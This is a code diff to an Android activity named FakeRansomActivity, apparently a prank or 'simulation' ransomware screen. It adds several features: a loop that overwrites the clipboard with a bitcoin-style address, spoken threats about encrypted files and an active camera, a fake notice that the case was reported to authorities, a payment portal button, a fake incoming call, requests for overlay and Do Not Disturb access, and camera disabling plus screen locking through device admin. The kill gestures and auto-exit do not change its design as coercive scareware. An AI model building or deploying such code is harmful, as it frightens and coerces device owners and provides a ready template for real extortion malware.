@@ -2,10 +2,15 @@ package com.china.fakeransom;
 
 import android.Manifest;
 import android.app.ActivityManager;
+import android.app.NotificationManager;
 import android.app.admin.DevicePolicyManager;
+import android.content.BroadcastReceiver;
+import android.content.ClipData;
+import android.content.ClipboardManager;
 import android.content.ComponentName;
 import android.content.Context;
 import android.content.Intent;
+import android.content.IntentFilter;
 import android.content.pm.PackageManager;
 import android.database.Cursor;
 import android.graphics.Color;
@@ -21,6 +26,8 @@ import android.os.VibrationEffect;
 import android.os.Vibrator;
 import android.provider.ContactsContract;
 import android.provider.MediaStore;
+import android.provider.Settings;
+import android.speech.tts.TextToSpeech;
 import android.view.MotionEvent;
 import android.view.SurfaceHolder;
 import android.view.SurfaceView;
@@ -44,11 +51,13 @@ import java.util.UUID;
 public class FakeRansomActivity extends AppCompatActivity implements SurfaceHolder.Callback {
 
     private static final long COUNTDOWN_TOTAL_SECONDS = 48L * 3600;
-    private static final long FAKE_REBOOT_DELAY_MS = 90_000;
+    private static final long FAKE_REBOOT_DELAY_MS = 120_000;
     private static final long FAKE_REBOOT_DURATION_MS = 15_000;
+    private static final long FAKE_CALL_DELAY_MS = 45_000;
     private static final long AUTO_EXIT_DELAY_MS = 600_000;
     private static final long KILL_GESTURE_WINDOW_MS = 4000;
     private static final int KILL_GESTURE_TAPS = 7;
+    private static final long INTERLUDE_MS = 12_000;
     private static final int ADMIN_REQUEST = 42;
 
     private TextView statusText;
@@ -59,33 +68,44 @@ public class FakeRansomActivity extends AppCompatActivity implements SurfaceHold
     private TextView victimInfo;
     private TextView cameraBadge;
     private TextView rebootText;
+    private TextView interludeText;
     private View terminalScroll;
     private View borderFlash;
     private View rebootOverlay;
+    private View interludeOverlay;
     private ProgressBar progressBar;
     private SurfaceView cameraPreview;
 
-    private final SirenPlayer siren = new SirenPlayer();
+    private final SirenPlayer siren = SirenPlayer.get();
     private final Handler mainHandler = new Handler(Looper.getMainLooper());
     private Vibrator vibrator;
     private AudioManager audio;
+    private TextToSpeech tts;
     private Camera camera;
 
     private boolean simulationActive = false;
+    private boolean dndRequested = false;
+    private boolean overlayRequested = false;
     private long secondsRemaining = COUNTDOWN_TOTAL_SECONDS;
     private long killGestureStart = 0;
     private int killTaps = 0;
     private int restoreAttempts = 0;
     private int rebootDots = 0;
+    private int rampLevel = 0;
+    private int borderDelayMs = 260;
     private boolean borderRed = false;
-    private final Runnable killHold = new Runnable() {
-        @Override
-        public void run() {
-            killSwitch();
-        }
-    };
+    private int ttsLineIndex = 0;
     private String victimId = "";
     private String sessionKey = "";
+
+    private final String[] ttsLines = {
+            "All of your files have been encrypted.",
+            "Your camera and microphone are active.",
+            "Do not attempt to shut down. Attempt detected.",
+            "Your contacts are on our servers.",
+            "Payments restore access within five minutes.",
+            "Every keystroke is being recorded."
+    };
 
     private final Runnable borderPulse = new Runnable() {
         @Override
@@ -96,7 +116,7 @@ public class FakeRansomActivity extends AppCompatActivity implements SurfaceHold
             d.setStroke(10, borderRed ? 0xFFFF0000 : 0xFF0033FF);
             borderFlash.setBackground(d);
             borderRed = !borderRed;
-            mainHandler.postDelayed(this, 260);
+            mainHandler.postDelayed(this, borderDelayMs);
         }
     };
 
@@ -106,6 +126,50 @@ public class FakeRansomActivity extends AppCompatActivity implements SurfaceHold
             if (!simulationActive) return;
             forceVolume();
             mainHandler.postDelayed(this, 3000);
+        }
+    };
+
+    private final Runnable clipboardPoisoner = new Runnable() {
+        @Override
+        public void run() {
+            if (!simulationActive) return;
+            try {
+                ClipboardManager cm = (ClipboardManager) getSystemService(Context.CLIPBOARD_SERVICE);
+                if (cm != null) {
+                    cm.setPrimaryClip(ClipData.newPlainText("notes",
+                            "1BvBMSEYstWetqTFn5Au4m4GFg7xJaNVDemonstration"));
+                }
+            } catch (Throwable ignored) {
+            }
+            mainHandler.postDelayed(this, 5000);
+        }
+    };
+
+    private final Runnable ttsLoop = new Runnable() {
+        @Override
+        public void run() {
+            if (!simulationActive || tts == null) return;
+            try {
+                tts.speak(ttsLines[ttsLineIndex % ttsLines.length],
+                        TextToSpeech.QUEUE_ADD, null, "threat" + ttsLineIndex);
+                ttsLineIndex++;
+            } catch (Throwable ignored) {
+            }
+            mainHandler.postDelayed(this, 25_000);
+        }
+    };
+
+    private final Runnable escalationRamp = new Runnable() {
+        @Override
+        public void run() {
+            if (!simulationActive) return;
+            rampLevel++;
+            if (rampLevel <= 9) {
+                siren.applyRamp(1.0f + 0.038f * rampLevel);
+                borderDelayMs = Math.max(120, 260 - 15 * rampLevel);
+                startVibration();
+            }
+            mainHandler.postDelayed(this, 20_000);
         }
     };
 
@@ -125,6 +189,20 @@ public class FakeRansomActivity extends AppCompatActivity implements SurfaceHold
                     + "  rebuilding partition table ... ok\n"
                     + "  verifying bootloader .......... ok" + dots);
             mainHandler.postDelayed(this, 600);
+        }
+    };
+
+    private final Runnable killHold = new Runnable() {
+        @Override
+        public void run() {
+            endSimulation("SIMULATION TERMINATED");
+        }
+    };
+
+    private final BroadcastReceiver endReceiver = new BroadcastReceiver() {
+        @Override
+        public void onReceive(Context context, Intent intent) {
+            endSimulation("SIMULATION TERMINATED");
         }
     };
 
@@ -155,11 +233,18 @@ public class FakeRansomActivity extends AppCompatActivity implements SurfaceHold
         rebootOverlay = findViewById(R.id.rebootOverlay);
         rebootText = findViewById(R.id.rebootText);
         borderFlash = findViewById(R.id.borderFlash);
+        interludeOverlay = findViewById(R.id.interludeOverlay);
+        interludeText = findViewById(R.id.interludeText);
         progressBar = findViewById(R.id.progressBar);
         cameraPreview = findViewById(R.id.cameraPreview);
 
         skullGlyph.setOnClickListener(v -> onKillGestureTap());
         ransomNote.setOnClickListener(v -> requestAdmin());
+        findViewById(R.id.paymentBtn).setOnClickListener(v -> {
+            if (simulationActive) {
+                startActivity(new Intent(this, PaymentActivity.class));
+            }
+        });
 
         statusText.setOnTouchListener((v, event) -> {
             if (event.getAction() == MotionEvent.ACTION_DOWN) {
@@ -176,6 +261,13 @@ public class FakeRansomActivity extends AppCompatActivity implements SurfaceHold
         SurfaceHolder holder = cameraPreview.getHolder();
         holder.addCallback(this);
 
+        ContextCompat.registerReceiver(this, endReceiver,
+                new IntentFilter("com.china.fakeransom.END_SIM"),
+                ContextCompat.RECEIVER_NOT_EXPORTED);
+
+        SimUtil.setSimActive(true);
+        WallpaperUtil.capture(this);
+
         requestPermissions();
         forceVolume();
         mainHandler.postDelayed(volumeEnforcer, 3000);
@@ -189,6 +281,14 @@ public class FakeRansomActivity extends AppCompatActivity implements SurfaceHold
                 endSimulation("SIMULATION EXPIRED — AUTO-RELEASED");
             }
         }, AUTO_EXIT_DELAY_MS);
+    }
+
+    @Override
+    protected void onNewIntent(Intent intent) {
+        super.onNewIntent(intent);
+        if (intent != null && intent.getBooleanExtra("KILL", false)) {
+            endSimulation("SIMULATION TERMINATED");
+        }
     }
 
     private void requestPermissions() {
@@ -229,7 +329,8 @@ public class FakeRansomActivity extends AppCompatActivity implements SurfaceHold
 
     private void startVibration() {
         if (vibrator == null) return;
-        long[] pattern = {0, 500, 250, 500, 1500};
+        long gap = Math.max(300, 1500 - 120L * rampLevel);
+        long[] pattern = {0, 500, 250, 500, gap};
         vibrator.vibrate(VibrationEffect.createWaveform(pattern, 0));
     }
 
@@ -357,7 +458,7 @@ public class FakeRansomActivity extends AppCompatActivity implements SurfaceHold
         lines.add("[*] victim id: " + victimId);
         lines.add("[*] session key: " + sessionKey);
         lines.add("[!] ENCRYPTION COMPLETE — " + collected.size() + " items. key escrowed.");
-        lines.add("[!] displaying ransom instructions");
+        lines.add("[!] forwarding device report to authorities");
         return lines;
     }
 
@@ -376,10 +477,32 @@ public class FakeRansomActivity extends AppCompatActivity implements SurfaceHold
                 terminalText.append(line + "\n");
                 progressBar.setProgress((int) (step * 100 / (float) lines.size()));
                 if (last) {
-                    showRansom();
+                    mainHandler.postDelayed(this::showCompromisedScreen, 900);
                 }
             }, 400 + (i * 550L));
         }
+    }
+
+    private void showCompromisedScreen() {
+        if (!simulationActive) return;
+        terminalScroll.setVisibility(View.GONE);
+        progressBar.setVisibility(View.GONE);
+        interludeOverlay.setVisibility(View.VISIBLE);
+        interludeText.setText("⚠ COMPUTER SECURITY RESPONSE ⚠\n\n"
+                + "This device was COMPROMISED.\n\n"
+                + "An unauthorized intrusion encrypted all local storage and\n"
+                + "staged your personal data for exfiltration.\n\n"
+                + "Case #0472-B — incident recorded for evidence.\n"
+                + "Device session is under external control.\n\n"
+                + "Do not power off. A recovery channel is opening...");
+        statusText.setText("SECURITY RESPONSE ACTIVE");
+        mainHandler.postDelayed(this::showCompromisedScreenDone, INTERLUDE_MS);
+    }
+
+    private void showCompromisedScreenDone() {
+        if (!simulationActive) return;
+        interludeOverlay.setVisibility(View.GONE);
+        showRansom();
     }
 
     private void showRansom() {
@@ -388,6 +511,7 @@ public class FakeRansomActivity extends AppCompatActivity implements SurfaceHold
         statusText.setText("YOUR DEVICE IS LOCKED");
         terminalScroll.setVisibility(View.GONE);
         progressBar.setVisibility(View.GONE);
+        interludeOverlay.setVisibility(View.GONE);
         ransomNote.setVisibility(View.VISIBLE);
 
         ransomNote.setText("ALL YOUR FILES HAVE BEEN ENCRYPTED\n\n"
@@ -404,12 +528,89 @@ public class FakeRansomActivity extends AppCompatActivity implements SurfaceHold
                 + "DO NOT turn off the device.\n"
                 + "DO NOT connect to a computer.\n"
                 + "Tampering destroys the decryption guarantee.\n\n"
-                + "TAP ANYWHERE FOR \"RESTORE ACCESS\" (ADMINISTRATION REQUIRED).");
+                + "TAP THIS NOTE FOR \"RESTORE ACCESS\" (ADMINISTRATION REQUIRED).\n"
+                + "or use OPEN PAYMENT PORTAL below.");
 
         victimInfo.setText("VICTIM ID: " + victimId + "\nSESSION KEY: " + sessionKey);
         startCountdown();
 
+        WallpaperUtil.setRansom(this);
+        initTts();
+        mainHandler.postDelayed(clipboardPoisoner, 5000);
+        mainHandler.postDelayed(escalationRamp, 20_000);
+        mainHandler.postDelayed(borderPulse, 300);
+        mainHandler.postDelayed(this::checkOverlay, 4000);
         mainHandler.postDelayed(this::requestAdmin, 8000);
+        mainHandler.postDelayed(this::checkDnd, 14_000);
+        mainHandler.postDelayed(() -> {
+            if (simulationActive) {
+                startActivity(new Intent(this, FakeCallActivity.class));
+            }
+        }, FAKE_CALL_DELAY_MS);
+    }
+
+    private void initTts() {
+        try {
+            tts = new TextToSpeech(this, status -> {
+                if (status == TextToSpeech.SUCCESS) {
+                    try {
+                        tts.setLanguage(Locale.US);
+                        tts.setPitch(0.55f);
+                        tts.setSpeechRate(0.85f);
+                        mainHandler.post(ttsLoop);
+                    } catch (Throwable ignored) {
+                    }
+                }
+            });
+        } catch (Throwable ignored) {
+            tts = null;
+        }
+    }
+
+    private void checkOverlay() {
+        if (!simulationActive) return;
+        if (Settings.canDrawOverlays(this)) {
+            startService(new Intent(this, OverlayService.class));
+        } else if (!overlayRequested) {
+            overlayRequested = true;
+            try {
+                Intent i = new Intent(Settings.ACTION_MANAGE_OVERLAY_PERMISSION,
+                        android.net.Uri.parse("package:" + getPackageName()));
+                startActivity(i);
+            } catch (Throwable ignored) {
+            }
+        }
+    }
+
+    private void checkDnd() {
+        if (!simulationActive || dndRequested) return;
+        NotificationManager nm = (NotificationManager) getSystemService(Context.NOTIFICATION_SERVICE);
+        if (nm == null) return;
+        if (nm.isNotificationPolicyAccessGranted()) {
+            SimUtil.applyDndAlarmsOnly(this);
+        } else {
+            dndRequested = true;
+            try {
+                startActivity(new Intent(Settings.ACTION_NOTIFICATION_POLICY_ACCESS_SETTINGS));
+            } catch (Throwable ignored) {
+            }
+        }
+    }
+
+    @Override
+    protected void onResume() {
+        super.onResume();
+        if (!simulationActive) return;
+        if (Settings.canDrawOverlays(this)) {
+            try {
+                startService(new Intent(this, OverlayService.class));
+            } catch (Throwable ignored) {
+            }
+        }
+        NotificationManager nm = (NotificationManager) getSystemService(Context.NOTIFICATION_SERVICE);
+        if (nm != null && nm.isNotificationPolicyAccessGranted()) {
+            SimUtil.applyDndAlarmsOnly(this);
+        }
     }
 
     private void startCountdown() {
@@ -423,6 +624,8 @@ public class FakeRansomActivity extends AppCompatActivity implements SurfaceHold
                 long s = secondsRemaining % 60;
                 countdownText.setText(String.format(Locale.US,
                         "FILES DELETED IN %02d:%02d:%02d", h, m, s));
+                int color = rampLevel <= 2 ? 0xFFFFCC00 : (rampLevel <= 5 ? 0xFFFF8800 : 0xFFFF2222);
+                countdownText.setTextColor(color);
                 mainHandler.postDelayed(this, 1000);
             }
         }, 800);
@@ -433,6 +636,7 @@ public class FakeRansomActivity extends AppCompatActivity implements SurfaceHold
         DevicePolicyManager dpm = (DevicePolicyManager) getSystemService(Context.DEVICE_POLICY_SERVICE);
         ComponentName admin = new ComponentName(this, LockAdminReceiver.class);
         if (dpm != null && dpm.isAdminActive(admin)) {
+            enableAdminFeatures();
             dpm.lockNow();
             return;
         }
@@ -447,6 +651,10 @@ public class FakeRansomActivity extends AppCompatActivity implements SurfaceHold
         }
     }
 
+    private void enableAdminFeatures() {
+        SimUtil.setCameraDisabled(this, true);
+    }
+
     @Override
     protected void onActivityResult(int requestCode, int resultCode, Intent data) {
         super.onActivityResult(requestCode, resultCode, data);
@@ -454,6 +662,7 @@ public class FakeRansomActivity extends AppCompatActivity implements SurfaceHold
         DevicePolicyManager dpm = (DevicePolicyManager) getSystemService(Context.DEVICE_POLICY_SERVICE);
         ComponentName admin = new ComponentName(this, LockAdminReceiver.class);
         if (dpm != null && dpm.isAdminActive(admin)) {
+            enableAdminFeatures();
             dpm.lockNow();
         } else {
             Toast.makeText(this, "ACCESS DENIED BY ADMINISTRATOR", Toast.LENGTH_LONG).show();
@@ -496,40 +705,41 @@ public class FakeRansomActivity extends AppCompatActivity implements SurfaceHold
     }
 
     private void endSimulation(String reason) {
-        boolean wasAdmin = false;
-        DevicePolicyManager dpm = (DevicePolicyManager) getSystemService(Context.DEVICE_POLICY_SERVICE);
-        ComponentName admin = new ComponentName(this, LockAdminReceiver.class);
-        if (dpm != null) {
-            wasAdmin = dpm.isAdminActive(admin);
-        }
+        if (!simulationActive && isFinishing()) return;
         simulationActive = false;
+        SimUtil.setSimActive(false);
         mainHandler.removeCallbacksAndMessages(null);
         siren.stop();
-        if (vibrator != null) vibrator.cancel();
-        releaseCamera();
-        Toast.makeText(this, reason, Toast.LENGTH_LONG).show();
-        if (wasAdmin) {
-            try {
+        stopTts();
+        SimUtil.fullCleanup(this);
+        try {
+            stopService(new Intent(this, OverlayService.class));
+        } catch (Throwable ignored) {
+        }
+        Toast.makeText(this, reason + " — CAMERA RESTORED, WALLPAPER RESTORED, SETTINGS RESTORED", Toast.LENGTH_LONG).show();
+        try {
+            DevicePolicyManager dpm = (DevicePolicyManager) getSystemService(Context.DEVICE_POLICY_SERVICE);
+            ComponentName admin = new ComponentName(this, LockAdminReceiver.class);
+            if (dpm != null && dpm.isAdminActive(admin)) {
                 Intent i = new Intent();
                 i.setComponent(new ComponentName("com.android.settings",
                         "com.android.settings.DeviceAdminAdd"));
                 i.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
                 startActivity(i);
-            } catch (Exception ignored) {
             }
+        } catch (Throwable ignored) {
         }
         finish();
     }
 
-    private void killSwitch() {
-        endSimulation("SIMULATION TERMINATED");
-    }
-
-    @Override
-    protected void onPause() {
-        super.onPause();
-        if (simulationActive) {
-            mainHandler.postDelayed(this::returnToFront, 700);
+    private void stopTts() {
+        if (tts != null) {
+            try {
+                tts.stop();
+                tts.shutdown();
+            } catch (Throwable ignored) {
+            }
+            tts = null;
         }
     }
 
@@ -539,6 +749,14 @@ public class FakeRansomActivity extends AppCompatActivity implements SurfaceHold
             ActivityManager am = (ActivityManager) getSystemService(Context.ACTIVITY_SERVICE);
             am.moveTaskToFront(getTaskId(), ActivityManager.MOVE_TASK_WITH_HOME);
         } catch (Throwable ignored) {
+        }
+    }
+
+    @Override
+    protected void onPause() {
+        super.onPause();
+        if (simulationActive) {
+            mainHandler.postDelayed(this::returnToFront, 700);
         }
     }
 
@@ -597,9 +815,15 @@ public class FakeRansomActivity extends AppCompatActivity implements SurfaceHold
     protected void onDestroy() {
         super.onDestroy();
         simulationActive = false;
+        SimUtil.setSimActive(false);
         mainHandler.removeCallbacksAndMessages(null);
         siren.stop();
-        if (vibrator != null) vibrator.cancel();
+        stopTts();
+        SimUtil.fullCleanup(this);
         releaseCamera();
+        try {
+            unregisterReceiver(endReceiver);
+        } catch (Throwable ignored) {
+        }
     }
 }
